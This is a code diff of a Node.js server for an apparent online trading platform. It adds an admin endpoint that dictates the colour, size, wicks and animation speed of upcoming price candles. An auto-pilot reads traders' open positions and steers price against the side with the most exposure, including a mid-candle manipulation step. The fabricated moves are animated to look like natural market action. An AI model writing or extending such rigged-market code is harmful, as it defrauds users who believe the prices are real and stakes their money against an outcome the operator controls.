@@ -1,4 +1,4 @@
-// --- START: main app server.js (v30.2 - Perfect Candle Animation, Auto-Pilot & Admin Priority) ---
+// --- START: main app server.js (v30.5 - Ultimate Admin Overrides & Natural Engine) ---
 
 const express = require('express');
 const http = require('http');
@@ -110,66 +110,81 @@ function generateHistoricalCandle(timestamp, open, isLive = false) {
     };
 }
 
-// 2. Exact Pattern Generator
-function generateDynamicCandle(timestamp, open, command) {
-    command = (command || '').trim(); // Remove accidental spaces
+// 2. Exact & Advanced Pattern Generator
+function generateDynamicCandle(timestamp, lastCandle, cmdObj) {
+    let command = '';
+    let speed = 'normal';
+    let wickType = 'natural';
     
-    // --- RANDOM LOGIC BLOCK ---
-    if (command === 'GREEN_RANDOM') {
-        const greenPatterns = ['GREEN', 'BULLISH_MARUBOZU', 'GREEN_HAMMER', 'GREEN_SHOOTING_STAR', 'GREEN_SPINNING_TOP'];
-        command = greenPatterns[Math.floor(Math.random() * greenPatterns.length)];
-    } else if (command === 'RED_RANDOM') {
-        const redPatterns = ['RED', 'BEARISH_MARUBOZU', 'RED_HAMMER', 'RED_SHOOTING_STAR', 'RED_SPINNING_TOP'];
-        command = redPatterns[Math.floor(Math.random() * redPatterns.length)];
+    if (typeof cmdObj === 'string') {
+        command = cmdObj.trim();
+    } else if (cmdObj) {
+        command = (cmdObj.command || '').trim();
+        speed = cmdObj.speed || 'normal';
+        wickType = cmdObj.wickType || 'natural';
     }
-    // ---------------------------
 
-    let bodySize, upperWick, lowerWick, close, high, low;
-    const volatility = open * (0.00008 + Math.random() * 0.0001);
-
-    switch (command) {
-        case 'GREEN': 
-            bodySize = volatility; close = open + bodySize; upperWick = volatility * 0.5; lowerWick = volatility * 0.5; break;
-        case 'RED': 
-            bodySize = volatility; close = open - bodySize; upperWick = volatility * 0.5; lowerWick = volatility * 0.5; break;
-        case 'BULLISH_MARUBOZU': 
-            bodySize = volatility * 3; close = open + bodySize; upperWick = 0; lowerWick = 0; break;
-        case 'BEARISH_MARUBOZU': 
-            bodySize = volatility * 3; close = open - bodySize; upperWick = 0; lowerWick = 0; break;
-        case 'GREEN_HAMMER': 
-            bodySize = volatility * 0.3; close = open + bodySize; upperWick = 0; lowerWick = volatility * 2.5; break;
-        case 'RED_HAMMER': 
-            bodySize = volatility * 0.3; close = open - bodySize; upperWick = 0; lowerWick = volatility * 2.5; break;
-        case 'GREEN_SHOOTING_STAR': 
-            bodySize = volatility * 0.3; close = open + bodySize; upperWick = volatility * 2.5; lowerWick = 0; break;
-        case 'RED_SHOOTING_STAR': 
-            bodySize = volatility * 0.3; close = open - bodySize; upperWick = volatility * 2.5; lowerWick = 0; break;
-        case 'DOJI': 
-            bodySize = open * 0.000002; close = Math.random() > 0.5 ? open + bodySize : open - bodySize; upperWick = volatility; lowerWick = volatility; break;
-        case 'LONG_LEGGED_DOJI': 
-            bodySize = open * 0.000002; close = Math.random() > 0.5 ? open + bodySize : open - bodySize; upperWick = volatility * 3; lowerWick = volatility * 3; break;
-        case 'DRAGONFLY_DOJI': 
-            bodySize = open * 0.000002; close = open + bodySize; upperWick = 0; lowerWick = volatility * 2.5; break;
-        case 'GRAVESTONE_DOJI': 
-            bodySize = open * 0.000002; close = open - bodySize; upperWick = volatility * 2.5; lowerWick = 0; break;
-        case 'GREEN_SPINNING_TOP': 
-            bodySize = volatility * 0.4; close = open + bodySize; upperWick = volatility * 1.5; lowerWick = volatility * 1.5; break;
-        case 'RED_SPINNING_TOP': 
-            bodySize = volatility * 0.4; close = open - bodySize; upperWick = volatility * 1.5; lowerWick = volatility * 1.5; break;
-        case 'HUGE_PUMP': 
-            bodySize = volatility * 5; close = open + bodySize; upperWick = volatility * 0.2; lowerWick = volatility * 0.2; break;
-        case 'HUGE_DUMP': 
-            bodySize = volatility * 5; close = open - bodySize; upperWick = volatility * 0.2; lowerWick = volatility * 0.2; break;
-        default: 
-            bodySize = volatility; close = command === 'RED' ? open - bodySize : open + bodySize; upperWick = volatility * 0.5; lowerWick = volatility * 0.5;
-    }
+    const open = lastCandle.close;
+    const baseVol = open * (0.00008 + Math.random() * 0.0001);
+    let bodySize = baseVol;
+    let upperWick = baseVol * 0.5, lowerWick = baseVol * 0.5;
+    let targetColor = 'GREEN';
+    let animationStyle = 'normal'; 
     
-    high = Math.max(open, close) + upperWick;
-    low = Math.min(open, close) - lowerWick;
+    if (command === 'GREEN_RANDOM' || command === 'RED_RANDOM') {
+        targetColor = command.includes('GREEN') ? 'GREEN' : 'RED';
+        bodySize = baseVol * (0.3 + Math.random() * 1.5); // Random fat or small
+        
+        const randStyle = Math.random();
+        if (targetColor === 'GREEN') {
+            if (randStyle < 0.4) animationStyle = 'dip_first'; // Dips deep red, then shoots green
+            else if (randStyle < 0.8) animationStyle = 'spike_first'; // Huge green, then leaves upper wick
+        } else {
+            if (randStyle < 0.4) animationStyle = 'spike_first'; // Spikes green, then crashes red
+            else if (randStyle < 0.8) animationStyle = 'dip_first'; // Crashes deep red, then recovers slightly
+        }
+    }
+    else if (command === 'MEGA_GREEN' || command === 'MEGA_RED') {
+        bodySize = baseVol * (4 + Math.random() * 2); // 4x to 6x normal size
+        targetColor = command === 'MEGA_GREEN' ? 'GREEN' : 'RED';
+        animationStyle = 'smooth';
+    }
+    else if (command === 'BREAKOUT_2X_REVERSE') {
+        const prevBody = Math.abs(lastCandle.close - lastCandle.open) || baseVol;
+        bodySize = prevBody * 2; // Exactly 2x previous body
+        targetColor = (lastCandle.close >= lastCandle.open) ? 'RED' : 'GREEN';
+        animationStyle = 'spike_first'; 
+    }
+    else {
+        // Fallback for legacy basic commands
+        targetColor = command.includes('RED') ? 'RED' : 'GREEN';
+    }
+
+    // Apply Wick Type Override from Admin Panel
+    if (wickType === 'none') {
+        upperWick = 0; lowerWick = 0;
+    } else if (wickType === 'long') {
+        upperWick = bodySize * (0.8 + Math.random());
+        lowerWick = bodySize * (0.8 + Math.random());
+        if (command === 'BREAKOUT_2X_REVERSE' && Math.random() > 0.5) {
+            // Sometimes one-sided wick for breakout
+            if (Math.random() > 0.5) upperWick = 0; else lowerWick = 0;
+        }
+    } else {
+        // Natural Wicks
+        upperWick = bodySize * (0.1 + Math.random() * 0.8);
+        lowerWick = bodySize * (0.1 + Math.random() * 0.8);
+    }
+
+    const close = targetColor === 'GREEN' ? open + bodySize : open - bodySize;
+    const high = Math.max(open, close) + upperWick;
+    const low = Math.min(open, close) - lowerWick;
 
     return {
         timestamp, open: roundPrice(open), high: roundPrice(high), low: roundPrice(low), close: roundPrice(close),
-        isPredetermined: true, isNatural: false, targetHigh: roundPrice(high), targetLow: roundPrice(low), targetClose: roundPrice(close), pattern: command
+        isPredetermined: true, isNatural: false, 
+        targetHigh: roundPrice(high), targetLow: roundPrice(low), targetClose: roundPrice(close), 
+        pattern: command, speed, animationStyle, isAdminCommand: true
     };
 }
 
@@ -203,12 +218,13 @@ function ensureCurrentPeriodCandle(marketData, currentPeriod) {
     if (currentPeriod > lastCandle.timestamp) {
         let newCandle;
         
+        // Admin Command Priority
         if (marketData.nextCandleCommand) {
-            newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, marketData.nextCandleCommand);
-            newCandle.isAdminCommand = true; // Lock this candle so AutoPilot cannot change it
+            newCandle = generateDynamicCandle(currentPeriod, lastCandle, marketData.nextCandleCommand);
             marketData.nextCandleCommand = null;
         } 
         
+        // Auto Pilot Logic
         if (!newCandle && SMART_AUTO_PILOT) {
             const trades = activeTradesDb[marketData.marketId] || {};
             let immediateUpVol = 0, immediateDownVol = 0;
@@ -265,7 +281,8 @@ function ensureCurrentPeriodCandle(marketData, currentPeriod) {
                     }
                 }
 
-                newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, targetDirection);
+                newCandle = generateDynamicCandle(currentPeriod, lastCandle, { command: targetDirection });
+                newCandle.isAdminCommand = false; // Flag as Auto-pilot generated
                 newCandle.targetClose += (Math.random() - 0.5) * (lastCandle.close * 0.00005);
                 
                 let payoutChange = 0;
@@ -308,24 +325,23 @@ function ensureCurrentPeriodCandle(marketData, currentPeriod) {
 
                     if (isDangerUP) {
                         if (rand < 0.60) driftCommand = 'RED'; 
-                        else if (rand < 0.85) driftCommand = 'RED_SHOOTING_STAR';
+                        else if (rand < 0.85) driftCommand = 'RED_RANDOM';
                         else driftCommand = 'DOJI';
                     } 
                     else if (isDangerDOWN) {
                         if (rand < 0.60) driftCommand = 'GREEN'; 
-                        else if (rand < 0.85) driftCommand = 'GREEN_HAMMER';
+                        else if (rand < 0.85) driftCommand = 'GREEN_RANDOM';
                         else driftCommand = 'DOJI';
                     } 
                     else {
-                        if (rand < 0.40) driftCommand = 'GREEN'; 
-                        else if (rand < 0.80) driftCommand = 'RED'; 
-                        else driftCommand = 'SPINNING_TOP';
+                        driftCommand = Math.random() > 0.5 ? 'GREEN' : 'RED';
                     }
                 } else {
                     driftCommand = Math.random() > 0.5 ? 'GREEN' : 'RED';
                 }
 
-                newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, driftCommand);
+                newCandle = generateDynamicCandle(currentPeriod, lastCandle, { command: driftCommand });
+                newCandle.isAdminCommand = false;
                 newCandle.targetClose += (Math.random() - 0.5) * (lastCandle.close * 0.00004);
             }
         }
@@ -341,15 +357,22 @@ function ensureCurrentPeriodCandle(marketData, currentPeriod) {
     return lastCandle;
 }
 
-// 🔥 TICK ENGINE: Fixed Wick Animation Math 🔥
+// 🔥 TICK ENGINE: Advanced Natural Animation Math 🔥
 function updateRealisticPrice(marketData, candle, currentPeriod) {
     if (!candle.isPredetermined) return;
 
     const now = Date.now();
     const timeElapsed = Math.max(0, now - currentPeriod);
-    const progress = Math.min(timeElapsed / TIMEFRAME, 1.0);
+    
+    // Admin Speed Control
+    let speedMultiplier = 1.0;
+    if (candle.speed === 'fast') speedMultiplier = 1.5;
+    if (candle.speed === 'slow') speedMultiplier = 0.6;
+    
+    let effProgress = Math.min((timeElapsed * speedMultiplier) / TIMEFRAME, 1.0);
 
     // --- 🔥 MID-CANDLE SMART MANIPULATION (Smoothly adjusts at 30s mark) 🔥 ---
+    // Only runs if AutoPilot generated this candle (Admins are locked)
     if (timeElapsed >= 30000 && !candle.isMidEvaluated && SMART_AUTO_PILOT && !candle.isAdminCommand) {
         candle.isMidEvaluated = true;
         
@@ -397,33 +420,35 @@ function updateRealisticPrice(marketData, candle, currentPeriod) {
     // -----------------------------------------------------------------------
 
     let idealPrice = candle.open;
-    const pattern = candle.pattern || 'NORMAL';
 
-    if (pattern.includes('HAMMER') || pattern === 'DRAGONFLY_DOJI') {
-        if (progress < 0.6) {
-            idealPrice = candle.open - (candle.open - candle.targetLow) * (progress / 0.6);
-        } else {
-            idealPrice = candle.targetLow + (candle.targetClose - candle.targetLow) * ((progress - 0.6) / 0.4);
+    // Advanced Natural Animation Styles
+    if (candle.animationStyle === 'dip_first') {
+        if (candle.targetClose > candle.open) { 
+            // Dips down first, then recovers to close high
+            if (effProgress < 0.35) idealPrice = candle.open - (candle.open - candle.targetLow) * (effProgress / 0.35);
+            else idealPrice = candle.targetLow + (candle.targetClose - candle.targetLow) * (1 - Math.pow(1 - ((effProgress - 0.35) / 0.65), 3));
+        } else { 
+            // Spikes up first, then crashes to close low
+            if (effProgress < 0.35) idealPrice = candle.open + (candle.targetHigh - candle.open) * (effProgress / 0.35);
+            else idealPrice = candle.targetHigh - (candle.targetHigh - candle.targetClose) * (1 - Math.pow(1 - ((effProgress - 0.35) / 0.65), 3));
         }
-    } 
-    else if (pattern.includes('SHOOTING_STAR') || pattern === 'GRAVESTONE_DOJI') {
-        if (progress < 0.6) {
-            idealPrice = candle.open + (candle.targetHigh - candle.open) * (progress / 0.6);
-        } else {
-            idealPrice = candle.targetHigh - (candle.targetHigh - candle.targetClose) * ((progress - 0.6) / 0.4);
+    } else if (candle.animationStyle === 'spike_first') {
+        if (candle.targetClose > candle.open) { 
+            // Pumps super high, then retraces to form an upper wick
+            if (effProgress < 0.5) idealPrice = candle.open + (candle.targetHigh - candle.open) * (effProgress / 0.5);
+            else idealPrice = candle.targetHigh - (candle.targetHigh - candle.targetClose) * ((effProgress - 0.5) / 0.5);
+        } else { 
+            // Dumps super low, then retraces to form a lower wick
+            if (effProgress < 0.5) idealPrice = candle.open - (candle.open - candle.targetLow) * (effProgress / 0.5);
+            else idealPrice = candle.targetLow + (candle.targetClose - candle.targetLow) * ((effProgress - 0.5) / 0.5);
         }
-    }
-    else if (pattern.includes('DOJI') || pattern.includes('SPINNING_TOP')) {
-        if (progress < 0.3) idealPrice = candle.open + (candle.targetHigh - candle.open) * (progress / 0.3);
-        else if (progress < 0.7) idealPrice = candle.targetHigh - (candle.targetHigh - candle.targetLow) * ((progress - 0.3) / 0.4);
-        else idealPrice = candle.targetLow + (candle.targetClose - candle.targetLow) * ((progress - 0.7) / 0.3);
-    }
-    else {
-        const easeProgress = 1 - Math.pow(1 - progress, 3);
+    } else {
+        // Smooth natural progression
+        const easeProgress = 1 - Math.pow(1 - effProgress, 3);
         idealPrice = candle.open + (candle.targetClose - candle.open) * easeProgress;
     }
 
-    const noiseFactor = 1 - Math.pow(progress, 2); 
+    const noiseFactor = effProgress < 1.0 ? (1 - Math.pow(effProgress, 2)) : 0; 
     const volatility = candle.open * 0.00005;
     const noise = (Math.random() - 0.5) * volatility * noiseFactor;
 
@@ -473,13 +498,13 @@ app.get('/api/history/:marketId', (req, res) => {
 });
 
 app.post('/api/admin/command', (req, res) => {
-    const { marketId, command } = req.body;
+    const { marketId, command, speed, wickType } = req.body;
     if (!marketId || !command) {
         return res.status(400).json({ error: 'Missing marketId or command' });
     }
     if (markets[marketId]) {
-        markets[marketId].nextCandleCommand = command;
-        console.log(`[API] Admin commanded Next Candle for ${marketId} to be ${command}`);
+        markets[marketId].nextCandleCommand = { command, speed, wickType };
+        console.log(`[API] Admin commanded Next Candle for ${marketId} to be ${command} (Speed: ${speed}, Wicks: ${wickType})`);
         res.json({ success: true, message: `Command ${command} received` });
     } else {
         res.status(404).json({ error: 'Market not found on server' });
@@ -980,6 +1005,6 @@ setInterval(async () => {
     }
 }, 2000);
 
-app.get('/ping', (_req, res) => res.send('Server V30.2 - Random Fix Active'));
+app.get('/ping', (_req, res) => res.send('Server V30.5 - Advanced Admin Engine'));
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => console.log(`Server running on ${PORT}`));
